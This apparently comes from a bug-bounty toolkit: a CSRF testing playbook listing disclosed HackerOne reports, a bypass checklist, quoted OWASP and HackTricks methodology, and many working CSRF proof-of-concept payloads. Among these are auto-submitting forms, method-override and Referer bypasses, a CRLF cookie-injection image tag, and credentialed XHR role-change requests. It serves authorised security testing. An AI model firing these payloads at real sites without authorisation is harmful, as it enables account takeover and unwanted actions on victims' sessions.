# Real-World Playbook — CSRF

**Class:** `csrf` · **Coverage-matrix tier:** 1 · **Hunter2:** /csrf · tools/csrf_scanner.py · **Skill:** client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed CSRF reports peak at **$10,000**. Rewarded across: Acronis, Coinbase, Dropbox, GitHub, GitHub Security Lab, GitLab, HackerOne, InnoGames.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **CSRF protection bypass in GitHub Enterprise management console** — GitHub, $10,000 · 151👍 · [1497169](https://hackerone.com/reports/1497169)
- **Argo CD CSRF leads to Kubernetes cluster compromise** — Internet Bug Bounty, $4,660 · 34👍 · [2326194](https://hackerone.com/reports/2326194)
- **CSRF on /api/graphql allows executing mutations through GET requests** — GitLab, $3,370 · 86👍 · [1122408](https://hackerone.com/reports/1122408)
- **Periscope iOS app CSRF in follow action due to deeplink** — X / xAI, $2,940 · 58👍 · [805073](https://hackerone.com/reports/805073)
- **Slack integration setup lacks CSRF protection** — HackerOne, $2,500 · 149👍 · [170552](https://hackerone.com/reports/170552)
- **CSRF token validation system is disabled on Stripe Dashboard** — Stripe, $2,500 · 86👍 · [1493437](https://hackerone.com/reports/1493437)
- **CSRF protection bypass on TikTok Webcast Endpoints** — TikTok, $2,500 · 79👍 · [1543234](https://hackerone.com/reports/1543234)
- **CSRF possible when SOP Bypass/UXSS is available** — HackerOne, $2,500 · 11👍 · [103787](https://hackerone.com/reports/103787)
- **CodeQL query for finding CSRF vulnerabilities in Spring applications** — GitHub Security Lab, $1,800 · 4👍 · [785120](https://hackerone.com/reports/785120)
- **Exfiltrate GDrive access token using CSRF** — Dropbox, $1,728 · 32👍 · [1468010](https://hackerone.com/reports/1468010)
- **Periscope android app deeplink leads to CSRF in follow action** — X / xAI, $1,540 · 224👍 · [583987](https://hackerone.com/reports/583987)
- **SQL Injection on /webApp/sijoitustalousuk email-parameter + potential lack of CSRF Token (viestinta.lahitapiola.fi)** — LocalTapiola, $1,350 · 18👍 · [191601](https://hackerone.com/reports/191601)
- **Chaining Bugs: Leakage of CSRF token which leads to Stored XSS and Account Takeover (xs1.tribalwars.cash)** — InnoGames, $1,100 · 186👍 · [604120](https://hackerone.com/reports/604120)
- **CSRF on TikTok Ads Portal** — TikTok, $1,000 · 23👍 · [1087436](https://hackerone.com/reports/1087436)
- **Leaking CSRF token over HTTP resulting in CSRF protection bypass** — Coinbase, $1,000 · 6👍 · [15412](https://hackerone.com/reports/15412)
- **Shopify.com Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** — Shopify, $800 · 48👍 · [1271944](https://hackerone.com/reports/1271944)
- **PUT Based CSRF via Client Side Path Traversal + Cookie Bomb on Acronis Cloud** — Acronis, $600 · 76👍 · [1860380](https://hackerone.com/reports/1860380)
- **Login CSRF vulnerability on hackerone.com** — HackerOne, $500 · 83👍 · [834366](https://hackerone.com/reports/834366)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

### CSRF bybass methods
- NO csrf token
- weak csrf token
- check content type
- check referer header
- chnage POST to GET or GET to post

### CSRF token bybass methods
- reomving ANI-csrf token
- NO check for the users token
- weak token
- Reasuable token
- change request method
- Guessable token
- Bybass referer

### method attacks
- remove referer header and send request and check response
- remove original header and send request and check response
- remove csrf  token and send request and check response



### Basic method no defenses
- the request
```
POST /myaccount/changeemail
HOST:


email=....
```

- the exploit
```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>

```
### CSRF where token validation depends on token being present
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
-THE exploit

```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token validation depends on request method
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
- Tips: change request TO GET in CSRF payloads
-THE exploit

```html
<form action="" method="GET">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token is not tied to user session
- steps                                                                                                                                                                     
1- create two accounts                                                                                                                                                                     
2- go to the first account and change email we will change                                                                                                                                                                     
3- go to second account and try intersept change email then drop request , copy the csrf token                                                                                                                                                                     
4- go to the first account and put csrf token(second account) and try change email is valid or not


### csrf bypass via method override
```
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
   <input type="hidden" name="_method" value="POST">
   <input type="hidden" name="email" value="">
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```
### CSRF where token is duplicated in cookie
```html
<html>
<body>
   <script>history.pushState(' ',' ','/')</script>
   <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
   <input type="hidden" name="email" value="a@gmail.com"/>
   <input type="hidden" name="csrf" value="fake"/>
   <input type="submit" value="submit request"/>
   </form>
   <img src="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
</html>
```
### CSRF where Referer validation depends on header being present
```html
<html>
<head>
   <meta name="referrer" content="no-referrer" >
</head>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="https://0a390078039fe0a780e435a600ca0059.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

### CSRF with broken Referer validation
```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/?0ad4003504bb812580aae57c00c40072.web-security-academy.net')</script>
   <form action="https://0ad4003504bb812580aae57c00c40072.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```
```
<img src="http://www.example.com/api/setusername?username=CSRFd">
```
```
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```
```
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```
```
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```
```
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Cross Site Request Forgery

|ID          |
|------------|
|WSTG-SESS-05|

#### Summary

Cross-Site Request Forgery ([CSRF](https://owasp.org/www-community/attacks/csrf)) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.

CSRF relies on:

1. Web browser behavior regarding the handling of session-related information such as cookies and HTTP authentication information.
2. An attacker's knowledge of valid web application URLs, requests, or functionality.
3. Application session management relying only on information known by the browser.
4. Existence of HTML tags whose presence cause immediate access to an HTTP[S] resource; for example the image tag `img`.

Points 1, 2, and 3 are essential for the vulnerability to be present, while point 4 facilitates the actual exploitation, but is not strictly required.

1. Browsers automatically send information used to identify a user session. Suppose *site* is a site hosting a web application, and the user *victim* has just authenticated to *site*. In response, *site* sends *victim* a cookie that identifies requests sent by *victim* as belonging to *victim’s* authenticated session. Once the browser receives the cookie set by *site*, it will automatically send it along with any further requests directed to *site*.
2. If the application does not make use of session-related information in URLs, then the application URLs, their parameters, and legitimate values may be identified. This may be accomplished by code analysis or by accessing the application and taking note of forms and URLs embedded in the HTML or JavaScript.
3. "Known by the browser" refers to information such as cookies or HTTP-based authentication information (such as Basic Authentication and not form-based authentication), that are stored by the browser and subsequently present at each request directed towards an application area requesting that authentication. The vulnerabilities discussed next apply to applications that rely entirely on this kind of information to identify a user session.

For simplicity's sake, consider GET-accessible URLs (though the discussion applies as well to POST requests). If *victim* has already authenticated themselves, submitting another request causes the cookie to be automatically sent with it. The figure below illustrates the user accessing an application on `www.example.com`.

*Figure 4.6.5-1: Session Riding*

The GET request could be sent by the user in several different ways:

- Using the web application
- Typing the URL directly in the browser
- Following an external link that points to the URL

These invocations are indistinguishable by the application. In particular, the third may be quite dangerous. There are a number of techniques and vulnerabilities that can disguise the real properties of a link. The link can be embedded in an email message, appear in a malicious site to which the user is lured, or appear in content hosted by a third-party (such as another site or HTML email) and point to a resource of the application. If the user clicks on the link, since they are already authenticated by the web application on *site*, the browser will issue a GET request to the web application, accompanied by authentication information (the session ID cookie). This results in a valid operation being performed on the web application that the user does not expect; for example, a funds transfer on a web banking application.

By using a tag such as `img`, as specified in point 4 above, it is not even necessary that the user follows a particular link. Suppose the attacker sends the user an email inducing them to visit a URL referring to a page containing the following (oversimplified) HTML.

```html
<html>
    <body>
...
...
    </body>
</html>
```

When the browser displays this page, it will try to display the specified zero-dimension (thus, invisible) image from `https://www.company.example` as well. This results in a request being automatically sent to the web application hosted on *site*. It is not important that the image URL does not refer to a proper image, as its presence will trigger the request `action` specified in the `src` field anyway. This happens provided that image download is not disabled in the browser. Most browsers do not have image downloads disabled since that would cripple most web applications beyond usability.

The problem here is a consequence of:

- HTML tags on the page resulting in automatic HTTP request execution (`img` being one of those).
- The browser having no way to tell that the resource referenced by `img` is not a legitimate image.
- Image loading that happens regardless of the location of the alleged image source, i.e., the form and the image itself need not be located on the same host or even the same domain.

The fact that HTML content unrelated to the web application may refer to components in the application, and the fact that the browser automatically composes a valid request towards the application, allows this kind of attack. There is no way to prohibit this behavior unless it is made impossible for the attacker to interact with application functionality.

In integrated mail/browser environments, simply displaying an email message containing the image reference would result in the execution of the request to the web application with the associated browser cookie. Email messages may reference seemingly valid image URLs such as:

```html
```

*(truncated — open the source link for the full method)*

### From HowToHunt
### Some MindMap
---
##### 6 CSRF Bypass by Hack3rSr0lls

##### CSRF Mindmap

##### Source
* [https://twitter.com/hackerscrolls/status/1265217322308046849](https://twitter.com/hackerscrolls/status/1265217322308046849)

##### Author
* [KathanP19](https://twitter.com/KathanP19)

### From AllAboutBugBounty
### Cross Site Request Forgery (CSRF)

#### Introduction
Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated

#### Where to find
Usually found in forms. Try submit the form and check the HTTP request. If the HTTP request does not have a CSRF token then it is likely to be vulnerable to a CSRF attack.

#### How to exploit
1. HTML GET Method

```html
<a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
```

2. HTML POST Method

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="uname" />
 <input type="submit" value="Submit Request" />
</form>
```

3. JSON GET Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

4. JSON POST Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

5. Multipart request
```html
<head>
    <title>Multipart CSRF PoC</title>
</head>
<body>
<br>
<hr>
<h2>Click Submit request</h2><br>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://example/api/users", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------149631704917378");
        xhr.withCredentials = true;
        var body = "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"action\"\r\n" + 
          "\r\n" + 
          "update\r\n" + 
          "-----------------------------149631704917378\r\n" + 
          "Content-Disposition: form-data; name=\"user_id\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### CSRF (Cross Site Request Forgery)


#### Cross-Site Request Forgery (CSRF) Explained

**Cross-Site Request Forgery (CSRF)** lets an attacker trigger actions through a victim's authenticated browser session. The victim visits attacker-controlled content, which causes requests through JavaScript, forms, images, or other browser primitives while the browser supplies ambient credentials.<sup>[[1]](#references)</sup><sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

##### Prerequisites for a CSRF Attack

To exploit a CSRF vulnerability, several conditions must be met:<sup>[[1]](#references)</sup>

1. **Identify a Valuable Action**: The attacker needs to find an action worth exploiting, such as changing the user's password, email, or elevating privileges.
2. **Ambient Credentials**: The request must carry credentials automatically, usually cookies or HTTP Basic/Digest authentication. In modern SPAs, also look for same-origin JavaScript gadgets that automatically attach bearer tokens or custom headers for you (client-side CSRF / CSPT2CSRF).
3. **Absence of Unpredictable Parameters**: The request should not contain unpredictable parameters, as they can prevent the attack.

##### Quick Check

When the action's response is not visible to the attacker, test for **blind CSRF** by observing side effects through a separate authenticated session, audit trail, or callback.<sup>[[12]](#references)</sup>

You could **capture the request in Burp** and check CSRF protections, and to test from the browser you can click on **Copy as fetch** and check the request:

<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- CSRF on email/password change → ATO
- Login CSRF → victim uses attacker account → data capture
- SameSite=None + no token → cross-site state change

## Hunter2 wiring
- **Run:** `/csrf · tools/csrf_scanner.py`
- **Skill:** `client-side-security`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Logout CSRF — logging the victim out is not a meaningful state change
- CSRF on a non-state-changing action (search, view, add-to-cart with no consequence)
- Login CSRF with no follow-on impact (victim lands in the attacker's account, nothing captured)
- Endpoint that is actually protected — token tied to session, SameSite=Lax/Strict, or JSON-only with a preflight — so the PoC never fires cross-site
- "No CSRF token" reported without a working cross-site PoC that completes the action
- Self-only CSRF affecting the attacker's own account

**Conditionally valid (only WITH a chain):** CSRF + a sensitive state-changing action (change email/password, transfer funds, delete account, add admin) + a working cross-site PoC → High.
